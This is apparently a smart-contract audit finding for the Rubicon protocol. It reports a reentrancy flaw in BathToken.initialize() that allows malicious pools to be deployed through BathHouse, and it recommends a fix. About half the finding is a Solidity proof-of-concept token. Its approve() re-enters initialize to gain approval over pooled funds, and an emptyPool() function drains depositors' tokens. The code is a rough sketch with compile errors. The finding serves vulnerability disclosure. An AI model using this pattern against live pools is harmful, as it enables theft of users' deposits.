## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [Malicious pools can be deployed through `BathHouse`](https://github.com/code-423n4/2022-05-rubicon-findings/issues/326) 

# Lines of code

https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153
https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214


# Vulnerability details

## Title
Malicious pools can be deployed through `BathHouse`

## Impact
Reentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.

## Proof of Concept
Create a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity =0.7.6;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "../../contracts/rubiconPools/BathToken.sol";

contract fakeToken is ERC20("trueToken", "TRUE"), Ownable {

    ERC20 trueToken;
    address marketAddress;
    uint256 counterApprove;
    BathToken bathToken;

    function setTrueToken(address _trueTokenAddress) onlyOwner {
        trueToken = ERC20(_trueTokenAddress);
    }

    function setMarketAddress(address _marketAddress) onlyOwner {
        marketAddress = _marketAddress;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        if (counterApprove == 1) { //first approve is from bathHouse
            bathToken = BathToken(msg.sender);
            bathToken.initialize(trueToken, owner, owner);
            attacked = false;
        }
        counterApprove++;
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function setAndApproveMarket(address _market){
        // sets legitimate market after malicious bathToken initialization
        bathToken.setMarket(_market);
        bathToken.approveMarket();
    }

    function emptyPool() onlyOwner {
        // sends pool tokens to attacker
        uint256 poolBalance = trueToken.balanceOf(address(bathToken));
        trueToken.transferFrom(address(bathToken), owner, poolBalance);
    }
}
```

This reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.

Since the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.

Code: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)

## Tools Used
Manual analysis

## Recommended Mitigation Steps
Add `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.

